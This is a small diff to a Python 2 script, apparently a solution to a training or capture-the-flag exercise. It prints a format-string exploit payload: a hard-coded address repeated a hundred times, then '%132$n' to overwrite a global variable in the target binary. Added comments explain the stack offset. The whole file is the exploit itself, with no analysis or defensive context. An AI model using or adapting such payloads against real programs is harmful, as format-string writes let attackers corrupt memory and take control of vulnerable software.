@@ -1,3 +1,8 @@
 #!/usr/bin/python
 
+# usage: 
+
+# target is a global, so we have to adjust for that
+
+#write to the 132nd address
 print "\x38\x96\x04\x08"*100 + "%132$n"
